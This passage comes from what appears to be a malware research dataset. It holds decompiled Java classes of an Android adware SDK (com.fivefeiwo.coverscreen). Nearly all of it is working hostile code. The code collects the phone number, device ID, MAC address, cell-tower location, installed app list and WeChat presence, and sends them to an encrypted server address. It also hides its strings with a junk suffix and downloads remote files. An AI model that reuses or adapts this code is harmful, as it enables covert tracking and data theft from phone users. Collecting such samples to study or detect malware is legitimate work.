this.a.b((Q)this.b.get(i));   }   public final void a(  ImageView imageView,  String str,  boolean z){     imageView.setTag(str);     aj.a().a(getContext(),str,new C0034w(this,imageView,str,z));   }   public final void b(){     c();     d();     h();   }   public final void b(  View view,  Q q){     int b=P.b(getContext());     if (Q.a.equals(q.h())) {       if (b == 4) {         if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.n())) {           c(view,q);           return;         }       }  else       if (""false_feiwocp"".replace(""_feiwocp"","""").equals(q.p())) {         c(view,q);         return;       }     }     a(view,q);     this.a.a(q);   }   protected void c(){   }   protected void d(){   }   public final void e(){     this.a.finish();   }   public void f(){   }   public final void g(){     i();     h();   }   public final void h(){     i();     if (this.b == null || this.b.isEmpty()) {       return;     }     if (this.c == null) {       this.c=new Timer();     }     this.d=new C0036y(this);     this.c.schedule(this.d,this.e,this.e);   }   public final void i(){     if (this.d != null) {       this.d.cancel();       this.d=null;     }     if (this.c != null) {       this.c.cancel();       this.c=null;     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0034w.code","public final class C0034w implements am {   private ImageView a;   private String b;   private boolean c;   private C0030s d;   public C0034w(  C0030s c0030s,  ImageView imageView,  String str,  boolean z){     this.d=c0030s;     this.a=imageView;     this.b=str;     this.c=z;   }   @Override public final void a(  Drawable drawable){     Bitmap createBitmap;     if (drawable == null || this.a.getTag() == null || !this.a.getTag().equals(this.b)) {       return;     }     if (!this.c) {       this.a.setImageDrawable(drawable);       return;     }     ImageView imageView=this.a;     Bitmap copy=((BitmapDrawable)drawable).getBitmap().copy(Bitmap.Config.ARGB_8888,false);     float a=an.a(this.d.getContext(),8.0f);     if (copy == null) {       createBitmap=null;     }  else {       createBitmap=Bitmap.createBitmap(copy.getWidth(),copy.getHeight(),Bitmap.Config.ARGB_8888);       Canvas canvas=new Canvas(createBitmap);       Paint paint=new Paint();       Rect rect=new Rect(0,0,copy.getWidth(),copy.getHeight());       RectF rectF=new RectF(rect);       paint.setAntiAlias(true);       canvas.drawARGB(0,0,0,0);       paint.setColor(-12434878);       canvas.drawRoundRect(rectF,a,a,paint);       paint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN));       canvas.drawBitmap(copy,rect,rect,paint);       copy.recycle();     }     imageView.setImageBitmap(createBitmap);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\C0036y.code","public final class C0036y extends TimerTask {   final C0030s a;   public C0036y(  C0030s c0030s){     this.a=c0030s;   }   @Override public final void run(){     this.a.a.runOnUiThread(new RunnableC0037z(this));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\CPManager.code","public final class CPManager extends AbstractC0012a {   private static CPManager h;   private List c;   private Date d;   private int e;   private boolean f;   private long g;   private CPManager(  Context context,  String str){     super(context,str);     this.d=null;     this.e=0;     this.f=false;   }   private int a(  Context context){     if (context == null || !P.a(context)) {       this.g=new Date().getTime();       this.f=true;       return 2;     }     if (this.c == null || this.c.isEmpty()) {       this.g=new Date().getTime();       this.f=true;       a(true);       return 2;     }     if (this.e >= this.c.size()) {       this.e=0;     }     if (!a(this.c,this.e)) {       return 4;     }     a(true);     return 0;   }   public static int a(  CPManager cPManager,  int i){     cPManager.e=0;     return 0;   }   public static List b(  JSONArray jSONArray){     if (jSONArray == null) {       return null;     }     ArrayList arrayList=new ArrayList();     for (int i=0; i < jSONArray.length(); i++) {       try {         Q a=Q.a(jSONArray.getJSONObject(i));         if (a != null && a.a() > 0) {           arrayList.add(a);         }       }  catch (      Exception e) {         return null;       }     }     return arrayList;   }   public static void close(  Context context){     context.sendBroadcast(new Intent(S.q));   }   public static void destory(  Context context){     if (h == null || context == null) {       return;     }     close(context);     h.a();   }   public static CPManager getInstance(){     return h;   }   public static CPManager init(  Context context,  String str){     if (h != null) {       return h;     }     if (context == null) {       throw new IllegalArgumentException(""context is null_feiwocp"".replace(""_feiwocp"",""""));     }     if (str == null || str.trim().length() < 8) {       throw new IllegalArgumentException(""appkey is error_feiwocp"".replace(""_feiwocp"",""""));     }     CPManager cPManager=new CPManager(context,str);     h=cPManager;     return cPManager;   }   public static void setShowAtScreenOn(  boolean z){     if (h != null) {       a=z;       ap.a(h.e(),S.j,S.m,z);     }   }   public static int showAd(  Context context){     if (h == null) {       return 1;     }     try {       return h.a(context);     }  catch (    Exception e) {       return 5;     }   }   @Override public final void a(){     super.a();     h=null;   }   public final void a(  int i){     this.e=i;   }   public final void a(  String str){     if (aq.a(str) || this.c == null) {       return;     }     Iterator it=this.c.iterator();     while (it.hasNext()) {       if (str.equals(((Q)it.next()).e())) {         it.remove();       }     }   }   @Override public final void b(){     if (this.b) {       e();       return;     }     if (this.d != null && this.d.getTime() > new Date().getTime() && this.c != null && this.c.size() > 0) {       e();       return;     }     this.b=true;     JSONObject a=H.a(e(),S.a);     ab abVar=new ab();     abVar.a(e(),I.e(),d(),a.toString());     abVar.a(new C0020i(this));     e();     Z.a().a(abVar);   }   @Override public final void c(){     super.c();     if (this.c == null || this.c.isEmpty() || !this.f) {       return;     }     this.f=false;     if (new Date().getTime() - this.g <= 10000) {       a(e());     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\D.code","final class D implements View.OnClickListener {   private B a;   public D(  B b){     this.a=b;   }   @Override public final void onClick(  View view){     if (this.a.a.e >= this.a.a.a().size()) {       this.a.a.f();       return;     }     Q q=(Q)this.a.a.a().get(this.a.a.e);     if (""true"".equals(q.q())) {       this.a.a.b(this.a.a.d.getChildAt(this.a.a.e),q);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0032u.code","public final class DialogInterfaceOnClickListenerC0032u implements DialogInterface.OnClickListener {   private View a;   private Q b;   private C0030s c;   public DialogInterfaceOnClickListenerC0032u(  C0030s c0030s,  View view,  Q q){     this.c=c0030s;     this.a=view;     this.b=q;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.c.a(this.a,this.b);     this.c.a.a(this.b);     this.c.h();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\DialogInterfaceOnClickListenerC0033v.code","public final class DialogInterfaceOnClickListenerC0033v implements DialogInterface.OnClickListener {   private C0030s a;   public DialogInterfaceOnClickListenerC0033v(  C0030s c0030s){     this.a=c0030s;   }   @Override public final void onClick(  DialogInterface dialogInterface,  int i){     this.a.h();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\E.code","final class E implements DownloadListener {   private WA a;   public E(  WA wa){     this.a=wa;   }   @Override public final void onDownloadStart(  String str,  String str2,  String str3,  String str4,  long j){     this.a.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\F.code","public final class F extends WebChromeClient {   private WA a;   public F(  WA wa){     this.a=wa;   }   @Override public final void onProgressChanged(  WebView webView,  int i){     this.a.setProgress(i * 100);     WA.a(this.a,""å·²åŠ è½½ >> _feiwocp"".replace(""_feiwocp"","""") + i + ""%"");     if (i >= 100) {       WA.a(this.a,null);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\G.code","public final class G extends WebViewClient {   private WA a;   public G(  WA wa){     this.a=wa;   }   @Override public final void onPageFinished(  WebView webView,  String str){     this.a.a.getSettings().setBlockNetworkImage(false);     super.onPageFinished(webView,str);   }   @Override public final void onReceivedError(  WebView webView,  int i,  String str,  String str2){     if (this.a.b.equalsIgnoreCase(str2) || (this.a.b + ""/"").equalsIgnoreCase(str2)) {       this.a.a.loadData(""<h1>Page load Error !</h1>_feiwocp"".replace(""_feiwocp"",""""),""text/html_feiwocp"".replace(""_feiwocp"",""""),""UTF-8_feiwocp"".replace(""_feiwocp"",""""));       this.a.c=true;     }     WA.a(this.a,""åŠ è½½å¤±è´¥_feiwocp"".replace(""_feiwocp"",""""));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\H.code","public class H {   private int a;   private String b;   private String c;   private String d;   private String e;   public H(){   }   public H(  int i,  String str,  String str2,  String str3,  String str4){     this.a=i;     this.b=str;     this.c=str2;     this.d=str3;     this.e=str4;   }   public static JSONObject a(  Context context,  double d,  double d2,  String str,  int i,  String str2,  String str3){     String a=ai.a(context);     String c=J.a(context).c();     String d3=J.a(context).d();     String b=J.a(context).b();     String a2=J.a(context).a();     String c2=ai.c(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""type_feiwocp"".replace(""_feiwocp"",""""),0);       jSONObject.put(""lat_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""lon_feiwocp"".replace(""_feiwocp"",""""),0.0d);       jSONObject.put(""cellid_feiwocp"".replace(""_feiwocp"",""""),c);       jSONObject.put(""lac_feiwocp"".replace(""_feiwocp"",""""),d3);       jSONObject.put(""mcc_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""url_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  int i){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""adid_feiwocp"".replace(""_feiwocp"",""""),i);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),S.a);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str){     String a=ai.a(context);     String b=J.a(context).b();     String a2=ai.a();     ao d=ai.d(context);     ah.a();     boolean a3=ah.a(context,""com.tencent.mm_feiwocp"".replace(""_feiwocp"",""""));     int b2=P.b(context);     String str2=ac.c().a() + "":"" + ac.c().b();     String c=J.a(context).c();     String d2=J.a(context).d();     String str3=(aq.a(c) || aq.a(d2)) ? """" : c + "":"" + d2;     String c2=ai.c(context);     String b3=ai.b();     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""latlon_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""cidlac_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""width_feiwocp"".replace(""_feiwocp"",""""),d.a);       jSONObject.put(""weixinflag_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""networktype_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  String str2){     JSONObject jSONObject=new JSONObject();     String a=ai.a(context);     String b=ai.b();     ah.a();     String a2=ah.a(context,false);     String str3=ai.d(context).a + ""*"" + ai.d(context).b;     String a3=ai.a();     String d=ai.d();     String c=ai.c();     String c2=J.a(context).c();     String b2=J.a(context).b();     String e=J.a(context).e();     ao d2=ai.d(context);     String str4=d2.a + ""*"" + d2.b;     String b3=ai.b(context);     String c3=ai.c(context);     try {       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""model_feiwocp"".replace(""_feiwocp"",""""),b);       jSONObject.put(""packagenames_feiwocp"".replace(""_feiwocp"",""""),a2);       jSONObject.put(""resolution_feiwocp"".replace(""_feiwocp"",""""),str3);       jSONObject.put(""brand_feiwocp"".replace(""_feiwocp"",""""),a3);       jSONObject.put(""versionrelease_feiwocp"".replace(""_feiwocp"",""""),d);       jSONObject.put(""versioncode_feiwocp"".replace(""_feiwocp"",""""),c);       jSONObject.put(""appkey_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str2);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""wifi_feiwocp"".replace(""_feiwocp"",""""),c3);       jSONObject.put(""call_id_feiwocp"".replace(""_feiwocp"",""""),c2);       jSONObject.put(""mac_feiwocp"".replace(""_feiwocp"",""""),b3);       jSONObject.put(""screen_size_feiwocp"".replace(""_feiwocp"",""""),str4);       jSONObject.put(""mobile_num_feiwocp"".replace(""_feiwocp"",""""),e);       jSONObject.put(""mnc_feiwocp"".replace(""_feiwocp"",""""),b2);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e2) {     }     return jSONObject;   }   public static JSONObject a(  Context context,  String str,  JSONArray jSONArray){     String a=ai.a(context);     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""adsdkversion_feiwocp"".replace(""_feiwocp"",""""),str);       jSONObject.put(""devid_feiwocp"".replace(""_feiwocp"",""""),a);       jSONObject.put(""installCount_feiwocp"".replace(""_feiwocp"",""""),jSONArray);       jSONObject.put(""sdktype_feiwocp"".replace(""_feiwocp"",""""),S.b);       jSONObject.put(""svt_feiwocp"".replace(""_feiwocp"",""""),S.c);     }  catch (    JSONException e) {     }     return jSONObject;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public int e(){     return this.a;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\I.code","public final class I {   private static final String a=R.a(""H8Zno4EBTQx9HFCC0rcAQqd931fYhjBLaFEZBiEdBCo=_feiwocp"".replace(""_feiwocp"",""""),R.a(""123456_feiwocp"".replace(""_feiwocp"","""")));   public static String a(){     return a + ""/webviewAdClick_feiwocp"".replace(""_feiwocp"","""");   }   public static String b(){     return a + ""/showCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String c(){     return a + ""/"" + ""clientinfo_feiwocp"".replace(""_feiwocp"","""");   }   public static String d(){     return a + ""/installCount_feiwocp"".replace(""_feiwocp"","""");   }   public static String e(){     return a + ""/getCoverScreenAdList_feiwocp"".replace(""_feiwocp"","""");   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\J.code","public class J {   private static J a;   private String b;   private String c;   private String d;   private String e;   private String f;   public J(){   }   private J(  Context context){     try {       TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone_feiwocp"".replace(""_feiwocp"",""""));       String networkOperator=telephonyManager.getNetworkOperator();       this.b=networkOperator.substring(0,3);       this.c=networkOperator.substring(3);       if (telephonyManager.getCellLocation() instanceof CdmaCellLocation) {         CdmaCellLocation cdmaCellLocation=(CdmaCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(cdmaCellLocation.getBaseStationId());         this.e=String.valueOf(cdmaCellLocation.getNetworkId());         this.f=telephonyManager.getLine1Number();       }  else       if (telephonyManager.getCellLocation() instanceof GsmCellLocation) {         GsmCellLocation gsmCellLocation=(GsmCellLocation)telephonyManager.getCellLocation();         this.d=String.valueOf(gsmCellLocation.getCid());         this.e=String.valueOf(gsmCellLocation.getLac());         this.f=telephonyManager.getLine1Number();       }     }  catch (    Exception e) {       e.getStackTrace();     }   }   public static J a(  Context context){     if (a == null) {       a=new J(context);     }     return a;   }   public String a(){     return this.b;   }   public String b(){     return this.c;   }   public String c(){     return this.d;   }   public String d(){     return this.e;   }   public String e(){     return aq.a(this.f) ? """" : this.f;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\K.code","public final class K {   private static K a=null;   private ExecutorService b;   private Map c=new HashMap();   private int d=0;   private int e=0;   private K(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);   }   public static K a(){     if (a == null) {       a=new K();     }     return a;   }   public static void a(  String str,  String str2){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2;     FileOutputStream fileOutputStream;     FileOutputStream fileOutputStream2=null;     r2=null;     fileOutputStream2=null;     HttpURLConnection httpURLConnection3=null;     FileOutputStream fileOutputStream3=null;     File file=new File(str2 + ""."" + System.currentTimeMillis()+ "".temp_feiwocp"".replace(""_feiwocp"",""""));     File file2=new File(str2);     if (file2.exists()) {       return;     }     try {       httpURLConnection2=(HttpURLConnection)new URL(str).openConnection();       try {         httpURLConnection2.setConnectTimeout(20000);         httpURLConnection2.setReadTimeout(20000);         httpURLConnection2.setRequestMethod(""GET_feiwocp"".replace(""_feiwocp"",""""));         httpURLConnection2.connect();         InputStream inputStream=httpURLConnection2.getInputStream();         FileOutputStream fileOutputStream4=new FileOutputStream(file);         try {           byte[] bArr=new byte[IController.L1_VALUE];           while (true) {             int read=inputStream.read(bArr);             if (read == -1) {               break;             }  else {               fileOutputStream4.write(bArr,0,read);             }           }           fileOutputStream4.flush();           fileOutputStream4.close();           file.renameTo(file2);           try {             fileOutputStream4.close();             if (httpURLConnection2 != null) {               httpURLConnection2.disconnect();             }           }  catch (          IOException e) {           }         }  catch (        FileNotFoundException e2) {           httpURLConnection3=httpURLConnection2;           fileOutputStream=fileOutputStream4;           if (fileOutputStream != null) {             try {               fileOutputStream.close();             }  catch (            IOException e3) {               return;             }           }           if (httpURLConnection3 != null) {             httpURLConnection3.disconnect();           }         } catch (        IOException e4) {           fileOutputStream3=fileOutputStream4;           if (fileOutputStream3 != null) {             try {               fileOutputStream3.close();             }  catch (            IOException e5) {               return;             }           }           if (httpURLConnection2 != null) {             httpURLConnection2.disconnect();           }         } catch (        Throwable th) {           fileOutputStream2=fileOutputStream4;           httpURLConnection=httpURLConnection2;           th=th;           if (fileOutputStream2 != null) {             try {               fileOutputStream2.close();             }  catch (            IOException e6) {               throw th;             }           }           if (httpURLConnection != null) {             httpURLConnection.disconnect();           }           throw th;         }       }  catch (      FileNotFoundException e7) {         httpURLConnection3=httpURLConnection2;         fileOutputStream=null;       } catch (      IOException e8) {       } catch (      Throwable th2) {         httpURLConnection=httpURLConnection2;         th=th2;       }     }  catch (    FileNotFoundException e9) {       fileOutputStream=null;     } catch (    IOException e10) {       httpURLConnection2=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;     }   }   public final Bitmap a(  Context context,  String str){     int i;     Bitmap bitmap;     int i2;     if (!new File(str).exists()) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=true;     BitmapFactory.decodeFile(str,options);     int i3=options.outWidth;     int i4=options.outHeight;     int i5=i3;     int i6=1;     while (true) {       int i7=i4;       int i8=i5 / 2;       if (this.d > 0) {         i=this.d;       }  else {         DisplayMetrics displayMetrics=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics);         this.d=displayMetrics.widthPixels;         i=displayMetrics.widthPixels;       }       if (i8 <= i) {         break;       }       int i9=i7 / 2;       if (this.e > 0) {         i2=this.e;       }  else {         DisplayMetrics displayMetrics2=new DisplayMetrics();         ((WindowManager)context.getSystemService(""window_feiwocp"".replace(""_feiwocp"",""""))).getDefaultDisplay().getMetrics(displayMetrics2);         this.e=displayMetrics2.heightPixels;         i2=this.e;       }       if (i9 <= i2) {         break;       }       i5/=2;       i4=i7 / 2;       i6<<=1;     }     options.inPurgeable=true;     options.inInputShareable=true;     options.inSampleSize=i6;     options.inJustDecodeBounds=false;     File file=new File(str);     if (file.exists()) {       bitmap=BitmapFactory.decodeFile(str,options);       if (bitmap == null) {         file.delete();       }     }  else {       bitmap=null;     }     return bitmap;   }   public final Drawable a(  Context context,  String str,  String str2){     if (str == null || str.equals("""")) {       return null;     }     File file=new File(str2);     if (!file.exists()) {       return null;     }     try {       file.setLastModified(System.currentTimeMillis());       return new BitmapDrawable(a(context,str2));     }  catch (    Exception e) {       return null;     } catch (    OutOfMemoryError e2) {       return null;     }   }   public final Drawable a(  Context context,  String str,  String str2,  N n){     if (this.c.containsKey(str)) {       SoftReference softReference=(SoftReference)this.c.get(str);       if (softReference.get() != null) {         if (0 != 0) {           softReference.get();         }         return (Drawable)softReference.get();       }     }     this.b.submit(new M(this,context,str,str2,true,new L(this,null,str)));     return null;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\L.code","final class L extends Handler {   private N a;   private String b;   public L(  K k,  N n,  String str){     this.a=n;     this.b=str;   }   @Override public final void handleMessage(  Message message){     if (message.obj == null || this.a == null) {       return;     }     N n=this.a;     Object obj=message.obj;     String str=this.b;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\M.code","public final class M implements Runnable {   private Context a;   private String b;   private String c;   private boolean d;   private Handler e;   private K f;   public M(  K k,  Context context,  String str,  String str2,  boolean z,  Handler handler){     this.f=k;     this.a=context;     this.b=str;     this.c=str2;     this.d=z;     this.e=handler;   }   @Override public final void run(){     Map map;     Drawable a=this.f.a(this.a,this.b,this.c);     new StringBuilder().append(""loadDrawable from method: getDrawableFromCache, drawable: "").append(a).append("", url: "").append(this.b);     if (a == null) {       try {         new StringBuilder().append(""save to file start: "").append(this.c).append("", url: "").append(this.b);         K k=this.f;         Context context=this.a;         K.a(this.b,this.c);         a=this.f.a(this.a,this.b,this.c);       }  catch (      IOException e) {         a=null;         new StringBuilder().append(""save to file failed: "").append(this.c).append("", url: "").append(this.b);       }     }     if (this.d && a != null) {       map=this.f.c;       map.put(this.b,new SoftReference(a));     }     this.e.sendMessage(this.e.obtainMessage(0,a));   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\N.code","public interface N { } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\O.code","public final class O {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b;   private static final byte[] c; static {     int[] iArr=new int[IController.START_VALUE];     b=iArr;     Arrays.fill(iArr,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;     byte[] bArr={65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     c=new byte[128];     for (int i2=0; i2 < 128; i2++) {       c[i2]=-1;     }     for (int i3=65; i3 <= 90; i3++) {       c[i3]=(byte)(i3 - 65);     }     for (int i4=97; i4 <= 122; i4++) {       c[i4]=(byte)((i4 - 97) + 26);     }     for (int i5=48; i5 <= 57; i5++) {       c[i5]=(byte)((i5 - 48) + 52);     }     c[43]=62;     c[47]=63;   }   public static final String a(  byte[] bArr,  boolean z){     return new String(b(bArr,z));   }   public static final byte[] a(  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.fivefeiwo.coverscreen.O.a(java.lang.String):byte[]"");   }   private static char[] b(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\P.code","public class P {   static P a;   ConcurrentLinkedQueue b;   Map c;   Context d;   Handler e;   public P(){   }   private P(  Context context){     this.b=new ConcurrentLinkedQueue();     this.c=new ConcurrentHashMap();     this.d=context;     this.e=new Handler();   }   public static P a(){     if (a == null) {       throw new RuntimeException(""DownloadManager is not yet initialize_feiwocp"".replace(""_feiwocp"",""""));     }     return a;   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnected();   }   public static int b(  Context context){     boolean z=true;     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null || !activeNetworkInfo.isConnected()) {       return 0;     }     String typeName=activeNetworkInfo.getTypeName();     if (typeName.equalsIgnoreCase(""WIFI_feiwocp"".replace(""_feiwocp"",""""))) {       return 4;     }     if (!typeName.equalsIgnoreCase(""MOBILE_feiwocp"".replace(""_feiwocp"",""""))) {       return 0;     }     if (!aq.a(Proxy.getDefaultHost())) {       return 1;     } switch (((TelephonyManager)context.getSystemService(""phone"")).getNetworkType()) { case 1:       z=false;     break; case 2:   z=false; break; case 4: z=false; break; case 7: z=false; break; case 11: z=false; break; } return z ? 3 : 2; } public static void c(Context context){ a=new P(context); } public void a(H h){ new StringBuilder().append(""[DownloadManager] removeTask: "").append(h.a()).append("","").append(h.d()); this.c.remove(h.d()); } public void a(H h,T t){ new StringBuilder().append(""[DownloadManager] addTask: "").append(h.a()).append("","").append(h.d()); U u=(U)this.c.get(h.d()); if (u != null) { u.a(t); return; } U u2=new U(this,h,t); this.c.put(h.d(),u2); u2.start(); } public boolean a(String str){ return this.c.containsKey(str); } public void b(){ U u=(U)this.b.poll(); while (u != null) { a(u.b,(T)u.a.poll()); u=(U)this.b.poll(); } } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.fivefeiwo.coverscreen\Q.code","public final class Q implements Serializable {   public static final String a=""download_feiwocp"".replace(""_feiwocp"","""");   public static final String b=""weixin_feiwocp"".replace(""_feiwocp"","""");   public static final String c=""weburl_feiwocp"".replace(""_feiwocp"","""");   private int d;   private int e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String n;   private String o;   private String p;   private String q;   private String r;   private String s;   private String t;   public static Q a(  JSONObject jSONObject){     if (jSONObject == null) {       return null;     }     Q q=new Q();     q.d=jSONObject.optInt(""id_feiwocp"".replace(""_feiwocp"",""""));     q.e=jSONObject.optInt(""adid_feiwocp"".replace(""_feiwocp"",""""),0);     q.f=jSONObject.optString(""image_feiwocp"".replace(""_feiwocp"",""""));     q.g=jSONObject.optString(""name_feiwocp"".replace(""_feiwocp"",""""));     